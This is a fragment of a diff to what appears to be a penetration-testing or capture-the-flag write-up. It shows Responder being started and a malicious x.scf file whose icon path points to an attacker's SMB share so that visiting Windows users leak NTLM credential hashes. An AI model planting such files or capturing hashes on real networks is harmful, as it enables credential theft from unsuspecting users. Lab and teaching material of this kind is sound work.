@@ -164,9 +164,13 @@ sudo responder -w -I tun0
 and create a file x.scf:
 
 [Shell]
+
 Command=2
+
 IconFile=\\10.10.XX.XX\tools\nc.ico
+
 [Taskbar]
+
 Command=ToggleDesktop
 
 
